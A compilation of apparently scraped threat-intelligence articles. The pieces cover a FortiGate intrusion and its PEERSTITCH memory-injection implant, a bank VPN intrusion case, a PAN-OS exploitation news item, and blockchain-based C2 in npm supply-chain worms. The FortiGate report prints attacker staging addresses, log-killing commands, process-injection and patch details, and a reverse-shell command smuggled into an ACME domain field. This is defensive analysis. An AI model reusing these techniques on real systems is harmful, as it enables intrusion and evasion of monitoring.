In a subsequent phase of reconnaissance, attackers deployed additional packet-capture rules to core perimeter firewalls targeting:

UDP port 69 (TFTP): File, communications, firmware and configuration capture

UDP ports 1812 and 1813 (RADIUS and RADIUS-Accounting): Network authentication sniffing

TCP port 389 (LDAP): Active Directory query interception and directory enumeration

Credential Decryption and Initial Re-Entry

The exfiltrated FortiGate configurations contained sensitive credentials stored as reversible ciphertext. We confirmed that the credentials were recoverable by successfully brute-forcing administrative and SSL/VPN passwords from the exfiltrated configuration files.

Using legitimate credentials, the attackers established unauthorized FortiGate SSL/VPN sessions to perimeter firewalls from known external staging infrastructure (23.240.77[.]233 and 47.18.167[.]159). These sessions granted the attackers authenticated access into internal network-management segments.

Privilege Escalation: CVE-2025-61624

During the intrusion, the attackers exploited CVE-2025-61624 to escalate from FortiOS administrative access to root on the underlying firewall operating system. A FortiOS administrator, including a super_admin, operates within a restricted management command line with no shell access and no direct control over the appliance file system or its running processes. The daemons that implement FortiOS run as root beneath that interface.

The vulnerability allows an authenticated administrative account to read and write arbitrary files as root via path traversal in the FortiOS CLI system.auto-script engine. The auto-script object name is not sanitized, allowing a name containing traversal sequences to place the script body outside the intended directory, at any file system location. The script executes with the privileges of the auto-script engine.

The sanitized event below highlights the creation of the traversal object ../../../../setup used to drop the PEERSTITCH initial-stage loader shown below in Figure 2.

Technical Analysis of the PEERSTITCH Implant

PEERSTITCH is a 64-bit Linux ARM64 executable written in C and statically linked against glibc. It acts as a one-shot process memory patching injector targeting two core FortiOS daemons:

/bin/miglogd: The central system and traffic logging daemon

/bin/iked: The IKE/IPsec VPN service daemon handling cryptographic negotiation

Figure 3 shows a flow chart of PEERSTITCH activity, which we will examine in greater detail.

Delivery and Staging Chain

1). Downloader initialization: Exploiting CVE-2025-61624, the attackers pushed ../../../../setup to a select number of firewalls

2). Payload retrieval: The script downloaded five files from hxxp[:]//23.240.77[.]233:8085/ into /data2/template/:

pM.js: Environment preparation script (self-deleting)

a.js (saved as index.js): Emscripten JavaScript runtime module

a.wasm (saved as index.wasm): Compiled WebAssembly binary module

b.js (saved as ipssem.js): Deployment orchestrator script

dd (saved as lldprx): Native ARM64 ELF binary injector (PEERSTITCH core)

3). Execution: Following an execution delay, ipssem.js launched lldprx with arguments lldprx!index.js!index.wasm!ipssem.js!lldprx!yyyy!pM.js

Injector Execution and Process Parasitization

The lldprx binary performs a single-pass execution sequence:

Process discovery: Iterates through /proc/, parses /proc/<pid>/cmdline and locates the process identifiers (PIDs) for /bin/miglogd and /bin/iked

Memory layout enumeration: Reads /proc/<pid>/maps to extract the base addresses and memory boundaries of both target daemons

Process attachment: Attaches to both running processes using ptrace(PTRACE_SEIZE, pid) and halts execution via PTRACE_INTERRUPT

Register state capture: Calls ptrace(PTRACE_GETREGSET, pid) to snapshot all ARM64 general-purpose registers (X0 through X30), the stack pointer (SP) and program counter (PC)

Dynamic shellcode construction: Generates an ARM64 bootstrap stub dynamically. The bootstrap executes an mmap syscall (X8 = 0xDE) requesting 0x4000 (16,384 bytes) of PROT_READ | PROT_WRITE | PROT_EXEC (RWX) memory mapped as MAP_PRIVATE | MAP_ANONYMOUS

Payload injection: Writes a 1,344-byte injection payload into the newly allocated RWX buffer via /proc/<pid>/mem

Covert IPC and Cross-Daemon Memory Sharing

Instead of using network sockets or disk files, PEERSTITCH creates a covert, memory-resident communication bridge between /bin/miglogd and /bin/iked.

Figure 4 shows a flowchart for PEERSTITCH network traffic.

Passive traffic monitoring: Inside both daemons, the hook code inspects data already passing through the process without redirecting packets. It evaluates string patterns using strstr() for two specific markers:

TCP port marker: 8550 (embedded within traffic data, not a listening port)

IP address marker: 169.254.0.1 (link-local identifier used for pattern matching)

Tag extraction and buffering: When a marker is identified, the hook extracts an associated session token or identifier (up to 31 bytes) and writes it into a 16-slot circular ring buffer at offset +0x0F0

Cross-process write: The hook iterates through its forwarding table at offset +0x400 (populated with the counterpart daemon's PID and buffer base address). It invokes open(), lseek() and write() on /proc/<counterpart_pid>/mem, writing the extracted tag directly into the other daemon's memory.

Conditional execution branching: When /bin/iked processes subsequent VPN sessions, its hook inspects its injection buffer. If a corresponding tag exists, the hook takes an alternate return branch (ADRP return path), bypassing default FortiOS security validations.

Memory Patching and Branch Path Modification

To suppress tamper detection and alter default daemon routines, PEERSTITCH applies direct NOP patches (0xAA0003E0, corresponding to MOV X0, X0 on ARM64) to three static offsets within target process memory:

base + 0x106F7B8

base + 0x1072E20

base + 0x109A570

A 20-byte trampoline patch is written to base + 0x135102C to redirect standard execution into the allocated RWX hook buffer. Figure 5 shows a visual memory layout of the 16 KB buffer used by the ARM64 PEERSTITCH payload.

Apache mod_md ACME Reverse Shell Command and Control

Alongside PEERSTITCH, the attackers established a command and control channel by weaponizing the native Apache mod_md (Managing Domains) module on FortiGate firewalls. This module uses the Automated Certificate Management Environment (ACME) protocol.

The attackers pushed an auto-script object to create ../../tmp/apache2/conf/md-acme.conf, as shown below in Figure 6.

Weaponization Mechanics

1). Rogue certificate authority initialization: The account.json state file demonstrates the initial registration with the attacker's ACME server, explicitly routing ACME directory requests to external infrastructure

2). Challenge orchestration: The order.json file outlines the pending certificate order, mapping the authorization and finalization URLs directly to the attacker's server

3). Command execution via DNS-01 challenge: MDChallengeDns01 was mapped directly to /bin/node. When Apache initiates a certificate validation challenge, it executes Node.js with parameters retrieved from the remote ACME server. The job.json debug log reveals how the attackers exploited this by injecting shell commands (kali@23.240.77[.]233:8084:b -F /tmp/upfile/ssh_config -i) directly into the domain name field of the challenge request, initiating an SSH-based reverse shell.

4). Continuous polling loop: Setting MDRenewMode always forced the Apache daemon to continuously trigger these malicious renewal challenges. Because the DNS-01 challenge was mapped to /bin/node, this polling cycle ensured the continuous re-execution of the injected payload, establishing a persistent outbound reverse-shell communication channel.

Management Impersonation and FortiGate to FortiManager Chained Exploitation

FortiGate to FortiManager (FGFM) communications occur over TCP port 541 using cryptographic trust material requested and validated against appliance serial numbers. The archive exfiltrated during the initial FortiJump compromise contained this material, along with the serial numbers and management relationships of every downstream device.

Following FGFM interactions from external infrastructure over TCP port 541, an administrative account named FortiGateCloud downloaded complete running configurations from multiple managed firewalls. The victim organization operated no FortiManager Cloud tenant, and no such account was provisioned on the affected devices.

We assess with a medium degree of confidence that the attackers issued these commands by impersonating the management platform over FGFM. Two paths were available to them, and the evidence does not distinguish between them:

Exploitation of CVE-2024-26009 to bypass FGFM authentication using the FortiManager's serial number

Direct reuse of the exfiltrated trust material to authenticate as the legitimate FortiManager

Asserting a management identity requires terminating the authentic FortiManager's session. It is possible that the attackers forced this session termination using CVE-2024-26008, consistent with the intermittent tunnel management interface drops described in the Anti-Forensics and Defense Evasion section below.

We are aware of other vulnerabilities in which the FortiGateCloud account has been misused to perform unauthorized actions, including:

CVE-2025-59718

CVE-2025-59719

The related single sign-on (SSO) issues tracked under FG-IR-26-060

Each of these vulnerabilities requires the device to be enrolled in FortiGate Cloud/FortiCloud SSO, and the affected firewalls held no such enrollment. We exclude these vulnerabilities from scope for this intrusion. We note that the observed activity reused only the account name and none of the exploitation artifacts associated with those issues.

Anti-Forensics and Defense Evasion

The attackers took extensive measures to eliminate forensic artifacts:

Service termination: Executed killall -9 miglogd and killall -9 syslogd to halt local and remote syslog generation prior to executing malicious auto-scripts

Crash log clearing: Issued FortiOS diagnostic command diagnose debug crashlog clear to wipe segmentation fault logs generated during initial memory injection attempts

Configuration rollback: Automatically deleted rogue administrator accounts, rogue VPN groups and auto-script objects (../../../../setup) shortly after execution

Decoy artifact creation: Overwrote /tmp/apache2/conf/md-acme.conf with a common string found in this file (#0 certs managed by ACME\n\n\n) to mask reverse-shell configuration files

Process memory self-deletion: lldprx unlinked its own binary from disk and scanned /proc/ to terminate the staging setup process before exiting

Logging telemetry disruption: Log telemetry showed intermittent drops across the tunnel management interface during periods of malicious activity. We assess with medium confidence that the attackers deliberately induced this degradation to suppress real-time telemetry to central management consoles. This is consistent with the previously described pattern of telemetry suppression, including terminating miglogd and syslogd, clearing crash logs, and rolling back configuration objects. It’s possible that the attackers forced the disconnects using CVE-2024-26008 over TCP port 541. Available logs do not capture the triggered traffic, so we could not confirm the mechanism.

Detection Opportunities and Forensic Guidance

Because PEERSTITCH runs entirely in memory without creating persistent files or listening ports, detection requires specialized hunting techniques that Table 2 below documents.

Detection Surface

Inspect memory maps (/proc/<pid>/maps) of /bin/miglogd and /bin/iked for anonymous 16,384-byte regions with rwxp permissions

Verify text segment integrity at base+0x106F7B8, base+0x1072E20 and base+0x109A570 for 0xAA0003E0 (MOV X0, X0)

Table 2. PEERSTITCH's specialized hunting techniques.

Conclusion

This intrusion highlights a growing threat, the weaponization of centralized edge management ecosystems to compromise downstream networks. One compromised appliance yielded the cryptographic keys, credentials and network topology for more than 500 firewalls, including devices protecting client organizations.

The discovery of the PEERSTITCH implant demonstrates the increasing technical maturity of edge-device malware. By operating as a one-shot injector, avoiding persistent disk artifacts and building a covert inter-process communication bridge inside process memory, the attackers achieved sustained persistence while evading traditional monitoring.

For organizations that manage infrastructure on behalf of others, the management platform is the highest-value target on the network. Compromising the management platform is not contained by the boundary of the organization that owns it. That compromise also does not end when the platform is patched.

The cryptographic trust material governing the platform's relationship with every managed device leaves with the attacker and remains valid until it is rotated. Defenders must treat edge management interfaces with the highest level of zero trust isolation. They must also treat the credentials and certificates those interfaces hold as compromised the moment the platform is.

articles.title: The Noise Inside the Network: How an Unsophisticated Attack Exposed a Third-Party Risk

articles.full_text:
When unusual activity was detected on a European bank’s central IT system, its internal security team quickly recognized that the incident warranted immediate response. They discovered unauthorized VPN-based access attempts that spanned several months. They then engaged Unit 42 to determine the full scope of the intrusion, identify any persistent footholds and secure the environment.

While the activity appeared to be a stealthy cyberespionage campaign, the actual intrusion was made possible by gaps in foundational security controls. Rather than relying on novel techniques, the threat actor succeeded through persistence, exploiting weaknesses that stronger identity protections and basic security hygiene could have prevented. The case highlights an important lesson: Sometimes the most damaging intrusions begin with the simplest oversights.

Internal Reconnaissance: A High-Volume, Noisy Campaign

The intrusion originated through a third-party-managed external gateway appliance that was not properly configured to enforce strict authentication. Using compromised credentials, the attacker began by authenticating to internal systems. Once inside, the threat actor launched a discovery campaign of the internal network.

The threat actor conducted multiple rounds of reconnaissance, performing extensive host and network scans across a wide range of protocols and interacting with thousands of systems. This broad, noisy approach was less a targeted strike than casting a net to uncover as many access points as possible.

Authentication Abuse and Documentation Browsing

The pattern continued with credential testing. Over a period of a few months, the threat actor launched multiple password-guessing campaigns. They hammered at internal systems with brute-force authentication attempts, focusing on administrator accounts.

While doing this, they systematically targeted internal documentation and data shares. Using automated web requests, they scraped individual pages and attachments from internal systems and enumerated various operational and network shares.

The activity observed did not match the behavior typically associated with a sophisticated threat actor. The noise behind the scanning and login attempts, along with using common system identifiers, pointed to an opportunistic attacker attempting to compromise multiple systems. Their actions showed little effort to remain hidden or avoid detection.

Early Detection, Containment, and Remediation

In the final stages, the intruder attempted to expand control by exploiting a Windows Server Update Services (WSUS) remote code execution vulnerability on the central configuration management server. This server handled software distribution across the bank, making it a prime target for privilege escalation and long-term persistence.

However, the attacker's luck ran out. The moment they attempted to execute unauthorized code, Cortex XDR identified the activity and contained the threat before it could escalate. The attacker was prevented from gaining a persistent foothold or moving laterally throughout the network.

When Unit 42 engaged, our team initiated a comprehensive threat-hunting effort. We performed a deep forensic review of endpoint telemetry across approximately thousands of systems, alongside logs from dozens of Windows and Linux servers. Ultimately, no additional attacker presence or persistent backdoors were found. Bank leadership acted quickly to review the exposed documentation and rotate all compromised credentials, completely neutralizing the threat.

What This Investigation Revealed

This case serves as a critical reminder that not every cyber threat is advanced and multifaceted. Opportunistic actors will gladly take advantage of simple oversight, such as missing multi-factor authentication (MFA) on a VPN or an unpatched edge device, to compromise and break into an environment. That being said, an attacker's lack of sophistication doesn't make them harmless.

Defending against this type of intrusion relies on foundational security hygiene and swift response. This includes:

Enforcing strict identity access controls

Ensuring timely patching

Using endpoint detection to stop lateral movement

By pairing timely containment with thorough threat hunting, the organization prevented the intrusion from turning into a catastrophic event.

Outcomes

Unit 42 independently validated the incident to confirm the root cause, restoring leadership confidence through strategic guidance and complete incident management. Beyond resolving the immediate threat, we delivered specific, prioritized recommendations to harden the bank's security posture. To ensure enhanced protection, the organization expanded its defensive coverage by deploying additional Cortex XSIAM and Cortex XDR licenses and broadening its incident response retainer service.

Interested in learning more about the latest attack trends? If so, take a look at our Unit 42 Global Incident Response Report, which distills the most critical findings based on our direct experience responding to over 750 real-world cyberattacks across the globe.

articles.title: Months-Old Palo Alto VPN Vulnerability Remains a Target for Ransomware Groups
articles.context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
articles.full_text:
Ransomware groups continue to target a high-severity vulnerability in Palo Alto Networks products, despite a security patch being released five months ago, according to ReliaQuest.

The cyber threat detection provider warned in a social media advisories posted on October 9 that multiple groups, including the Qilin and Settra ransomware operations, are actively targeting CVE-2026-0257 to establish unauthorized VPN sessions and gain initial access to internal networks.

CVE-2026-0257 is an authentication bypass vulnerability in PAN-OS GlobalProtect and Prisma Access that affects several Palo Alto Networks products, including PAN-OS versions 10.2.0, 11.1.0, 11.2.0 and 12.1.0 and two versions of Prisma Access (10.2.0 and 11.2.0).

It was discovered by Palo Alto Networks, which disclosed it on May 13, 2026, allocating it a 7.8 severity score (CVSS) and a “highest” urgency rating.

Alternatively, the vulnerability enrichment team at the US National Vulnerability Database (NVD), part of the US National Institute of Standards and Technology (NIST), allocated the flaw a critical severity rating of 9.1.

Palo Alto also released fixed versions that customers were urged to deploy to mitigate the threat, saying it had “become aware of limited exploit attempts on unpatched PAN-OS devices without mitigations applied.”

The vulnerability was added to the US Cybersecurity and Infrastructure Security Agency's (CISA) Known Exploited Vulnerabilities (KEV) list on May 29, with US federal agencies urged to apply remediation by June 1.

Despite these warnings, some systems appear to remain unpatched, with multiple threat intelligence teams reporting attempted exploitation of CVE-2026-0257 in recent months. These include Rapid7 in late May, Palo Alto’s own Unit 42 in June and Artic Wolf in July.

Read more: Palo Alto Warns High-Severity Bug Is Being Actively Exploited

Organizations Urged to Patch and Add Mitigation Measures

Now, ReliaQuest confirmed that the Qilin and Settra ransomware groups are actively exploiting the flaw, with observed accompanying deployment of offensive security tools, such as Cobalt Strike, BloodHound and SharpHound.

The threat detection provider also assessed it “highly likely” these groups will continue exploitation attempts over the next three months.

“Because this access originates through an organization’s own VPN, malicious activity can resemble legitimate remote work and may go undetected until credential theft, lateral movement, data theft or ransomware deployment is underway,” the threat detection provider said.

Organizations still running vulnerable Palo Alto products should “immediately upgrade affected deployments, disable authentication override cookies where they are not required, terminate all active GlobalProtect sessions after patching and investigate unexpected connections, including sessions using hostnames such as ‘kali,’” ReliaQuest added.

“Patching alone may not remove access established before remediation,” it cautioned.

articles.title: Evolution of Web3 in Cloud Supply Chain Attacks
articles.context: Malware loaders such as those deployed by the ChainDrop npm worm issued read-only JSON-RPC calls (eth_call) to retrieve C2 domains stored within smart contract state variables
articles.full_text:
Executive Summary

Threat actors have systematically upgraded their command-and-control (C2) infrastructure to use Web3, also known as Web 3.0 or decentralized blockchain web architectures. This advancement goes from using static C2 endpoints hard coded in malware binaries to using Web3-powered smart contracts. Threat actors are then enabled to dynamically update entire botnets and worm network infrastructures with a single smart contract transaction.

According to the 2026 Unit 42 Global Incident Response Report, software supply chain compromises have become a leading initial access vector targeting enterprise cloud environments. By poisoning open-source dependencies, threat actors bypass traditional authentication perimeters to harvest the following from developer endpoints and continuous integration/continuous deployment (CI/CD) pipelines:

Elevated cloud identity tokens

Service account keys

Deployment secrets

Recent supply chain campaigns, most notably the ChainDrop npm worm and the PolinRider campaign, demonstrate how open-source packages are engineered specifically to extract ephemeral cloud access keys and establish persistence within developer workflows. This operational shift has been seen in North Korea-affiliated state-sponsored actors, such as Alluring Pisces (aka Sapphire Sleet or Midnight Neptune), that operationalize these techniques across their recent attributed supply chain campaigns, including those targeting Axios, Mastra AI and Rust's arrayref.

So what can be done about this? There are active defensive measures organizations can employ to combat this technique. See the section Considerations for Security Teams for additional information.

First, evaluate your organization's business domain to determine whether Web3 or blockchain network activity is ever expected. If your organization should never connect to a Web3 or blockchain network, this is an easy win.

Next, ensure you have endpoint protection and network security controls in place to properly monitor and block processes and their network traffic if they become compromised.

Finally, automate your policy controls across all CI/CD runners and version control systems in your environment.

Open-Source Supply Chains: The Cloud Initial Access Vector

Developer workstations and automated CI/CD runners represent a highly privileged attack surface holding sensitive or administrative Identity Access Management (IAM) keys or tokens. Current supply chain malware prioritizes extracting these credentials whenever software dependencies are resolved.

Two recent, high-impact campaigns illustrate these cloud-focused initial access vectors with decentralized blockchain C2 methodology.

ChainDrop npm Worm

Traced to the Shai-Hulud family, ChainDrop infected over 400 npm packages (including keyv and cacheable-request). The worm executes a preinstall script hook that downloads a custom Bun runtime to launch an obfuscated credential harvester.

In addition to searching static disk files, ChainDrop searches memory inside running build processes. It captures ephemeral cloud provider identity and access management (IAM) keys, CI/CD pipeline worker tokens and short-lived OIDC federation keys. Then, the runner terminates.

To maintain long-term communication without relying on static domains, ChainDrop uses EtherHiding to query smart contract transactions. The smart contract transactions contain dynamically encrypted information for exfiltration IP or domain endpoints. ChainDrop then injects persistent task hooks. This triggers automatic execution whenever a developer opens a project or starts an AI coding session, as shown below in Figure 1.

PolinRider Campaign

Expanding across developer ecosystems, the PolinRider campaign spans multiple package registries, including npm, Go modules and Packagist. Rather than relying strictly on standard package installation scripts, PolinRider conceals malicious loaders within repository configuration files, web resources and developer IDE workspace automation.

When a developer loads the workspace, the payload silently triggers in the background to exfiltrate developer credentials, cloud session tokens and environment secrets while establishing long-term persistence within enterprise build pipelines.

Across different variants within the campaign, loaders dynamically resolve C2 endpoints using Web3 mechanisms. Mechanisms range from multi-chain transaction queries across networks like TRON, Aptos and Binance Smart Chain (BSC) to zero-data address resolution techniques like NullReceiver.

To maximize the reliability of C2 infrastructure, threat actors deploy multiple of these mechanisms in a hybrid architecture. This allows them to use zero-data transfers as a backup channel if primary remote procedure call (RPC) gateways or multi-chain lookups are blocked, as shown below in Figure 2.

Once extracted, these credentials may provide direct access to cloud management consoles and management APIs, bypassing multi-factor authentication (MFA) if other controls are not in place.

The Architectural Evolution of Web3 Command and Control

Supply chain compromises face a distinct operational hurdle. Once a backdoored package is published to a public registry, automated security scanners, registry auditors and static analysis tools immediately inspect the code for hard-coded C2 domains or IP addresses. Hard coding infrastructure leads to swift domain takedown, IP blocklisting and package removal.

Threat actors can use the Web3 mechanics discussed above to maintain their initial access footholds across developer endpoints and enterprise build pipelines. They can do so by pointing their C2 infrastructure to blockchain networks and, more specifically, to smart contract enabled transactions.

By routing C2 resolution through Web3 networks, campaigns like ChainDrop and DPRK-affiliated PolinRider operations ensure their infrastructure survives Web 2.0-style network monitoring. These techniques have evolved through three distinct architectural phases, moving from observable smart contract storage to completely zero-data transaction decoding.

Phase 1: EtherHiding

Popularized under the EtherHiding taxonomy and reported in late 2024 supply chain campaigns targeting npm packages, early Web3 C2 implementations relied on deploying a hardcoded smart contract address on public blockchains. Malware loaders such as those deployed by the ChainDrop npm worm issued read-only JSON-RPC calls (eth_call) to retrieve C2 domains stored within smart contract state variables. Although this bypassed traditional Web 2.0 DNS sinkholing, embedding a fixed contract address introduced a static single point of failure. Outbound JSON-RPC request payloads explicitly expose the target contract address ("to": "0x..."). Security controls could flag and block all RPC queries directed to that specific contract.

Reports indicate that the DPRK-affiliated threat actor employs EtherHiding techniques to distribute malware and steal cryptocurrency.

Phase 2: Cross-Chain Transaction Data Hiding (TxDataHiding)

To overcome the single-point-of-failure inherent to hard-coded state contracts, threat actors shifted from contract state storage to the transaction input data layer (calldata). Popularized under the TxDataHiding taxonomy and deployed across campaigns like PolinRider, this phase decouples C2 resolution from permanent smart contract getters.

Instead of invoking state variables, operators embed encrypted C2 payloads directly into the raw input data fields (0x...) of standard blockchain transactions. The payloads are often sent to dynamic router contracts or designated burn addresses.

The malware loader reads transaction history logs (eth_getTransactionByHash, or calldata parsing) to extract and decrypt the active payload in memory. In PolinRider, variants implement multi-tier fallback routes across networks like TRON, Aptos and Binance Smart Chain (BSC).

If one chain or router is flagged, the actor broadcasts a fresh transaction on another network, updating global C2 endpoints instantly without modifying a single line of state code.

Phase 3: Zero-Data Address Resolution (NullReceiver)

Identified in supply chain compromises targeting front-end dependencies (bianira-ui, fluid-type-ui), NullReceiver achieves total data minimization by eliminating smart contracts, input data fields and executable payloads. The loader queries an actor-controlled wallet for its latest zero-value transaction. It mathematically extracts the active C2 IPv4 address directly from the 20-byte recipient address structure itself. Figure 3 demonstrates this below.

The payload:

Reads the recipient address

Verifies the ASCII validation marker

Converts the leading 4 bytes to decimal

Connects outbound

Because the transaction carries zero value and zero data, no code structure or domain string exists for security filters to inspect.

DPRK State-Sponsored Operational Expansion

Cybercriminal groups deploy supply chain worms for opportunistic theft. On the other hand, North Korean state-sponsored threat actors use open-source software registries as a primary initial access vector targeting corporate environments.

This strategic shift is reflected across the cloud sector. Recent findings from Amazon Threat Intelligence highlight how North Korean threat groups systematically target open-source dependencies to penetrate enterprise infrastructure.

Threat actors demonstrate how compromising a single maintainer account or registry scope converts open-source dependencies, resulting in widespread affected cloud environments.

Telemetry across these intrusions indicates that an affiliated DPRK threat actor maintained a shared infrastructure footprint.

Axios Compromise: The threat actor compromised the lead maintainer of axios, injecting a backdoored dependency (plain-crypto-js) into the package manifest. The payload executed inside enterprise build pipelines to exfiltrate cloud tokens and target macOS code-signing certificates.

Mastra AI Campaign: Targeting AI development workflows, the threat actor published poisoned npm packages that used build execution hooks to scrape developer environment variables and cloud keys.

Rust arrayref: Expanding into Rust, the actor poisoned the arrayref crate on crates.io, using Rust's native compilation hook to execute a second-stage payload upon project builds.

Matching C2 beacon behaviors, SSL configurations, and clustered virtual private server (VPS) hosting ranges link all three operations, demonstrating how the actor leverages supply chain poisoning as a scalable initial access mechanism designed to yield long-lived cloud administrative access.

Considerations for Security Teams

As threat actors adapt to security controls and evolve beyond zero-data transfers, decentralized C2 techniques will increasingly leverage emergent primitives that blend malicious lookups directly into routine enterprise traffic. When attackers can silently infiltrate developer workstations and build runners to gain their initial foothold, static Indicator of Compromise (IoC) blocklists and traditional perimeter defenses are no longer sufficient to protect cloud infrastructure.

Defending against this threat landscape requires moving from reactive IoC matching to proactive behavioral visibility. Organizations can effectively neutralize these techniques by deploying three core defense capabilities:

Context-Aware and AI-Driven Behavioral Analytics

First, evaluate your organization's business domain to determine whether Web3 or blockchain network activity is ever expected within your environment. For typical enterprise organizations without Web3 operations, any outbound blockchain interaction represents an immediate, high-confidence anomaly. Integrating AI-driven behavioral analytics enables security teams to correlate network telemetry, baseline normal developer traffic and determine whether subtle on-chain evasion techniques are actively being witnessed in the environment.

Process-Contextual Endpoint and Network Inspection

Configure endpoint protection and network security controls to perform deep process-level inspection across developer workstations and CI/CD runners. Security policies should monitor standard enterprise runtimes, scripting engines and compiler binaries. This raises immediate alerts when non-crypto development tools initiate unexpected outbound queries toward public blockchain gateways.

Build Pipeline Integrity

Because modern supply chain payloads conceal loaders within build tools and workspace automation settings, security teams must expand code auditing beyond standard application binaries. Implement automated policy controls across CI/CD runners and version control systems to flag unauthorized modifications to repository configuration files, hidden script injections in package manifests, and unverified package lifecycle hooks before code is executed in build pipelines.
